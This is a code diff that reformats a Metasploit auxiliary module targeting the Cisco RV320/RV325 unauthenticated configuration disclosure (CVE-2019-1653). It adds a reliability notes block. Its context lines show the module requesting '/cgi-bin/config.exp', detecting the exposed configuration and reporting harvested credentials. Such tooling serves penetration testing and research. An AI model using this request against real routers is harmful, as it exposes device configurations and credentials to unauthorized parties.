@@ -7,9 +7,11 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Cisco RV320/RV326 Configuration Disclosure',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Cisco RV320/RV326 Configuration Disclosure',
+        'Description' => %q{
           A vulnerability in the web-based management interface of Cisco Small Business
           RV320 and RV325 Dual Gigabit WAN VPN routers could allow an unauthenticated,
           remote attacker to retrieve sensitive information. The vulnerability is due
@@ -19,14 +21,12 @@ class MetasploitModule < Msf::Auxiliary
           download the router configuration or detailed diagnostic information. Cisco
           has released firmware updates that address this vulnerability.
         },
-      'Author'         =>
-        [
+        'Author' => [
           'RedTeam Pentesting GmbH <release@redteam-pentesting.de>',
           'Aaron Soto <asoto@rapid7.com>'
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['EDB', '46262'],
           ['BID', '106732'],
           ['CVE', '2019-1653'],
@@ -34,18 +34,24 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],
           ['URL', 'https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20110330-acs.html']
         ],
-      'DisclosureDate' => '2019-01-24',
-      'DefaultOptions' =>
-        {
-          'SSL'   => true
+        'DisclosureDate' => '2019-01-24',
+        'DefaultOptions' => {
+          'SSL' => true
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
         }
-    ))
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('TARGETURI', [true, 'Path to the device configuration file', '/cgi-bin/config.exp']),
-      ])
+      ]
+    )
   end
 
   def report_cred(user, hash)
@@ -100,8 +106,8 @@ class MetasploitModule < Msf::Auxiliary
     begin
       uri = normalize_uri(target_uri.path)
       res = send_request_cgi({
-        'uri'     => uri,
-        'method'  => 'GET',
+        'uri' => uri,
+        'method' => 'GET',
       }, 60)
     rescue OpenSSL::SSL::SSLError
       fail_with(Failure::UnexpectedReply, 'SSL handshake failed.  Consider setting SSL to false and trying again.')
@@ -116,8 +122,8 @@ class MetasploitModule < Msf::Auxiliary
     body = res.body
     if body.match(/####sysconfig####/)
       parse_config(body)
-    else body.include?"meta http-equiv=refresh content='0; url=/default.htm'"
-      fail_with(Failure::NotVulnerable, 'Response suggests device is patched')
+    else body.include? "meta http-equiv=refresh content='0; url=/default.htm'"
+         fail_with(Failure::NotVulnerable, 'Response suggests device is patched')
     end
   end
 end
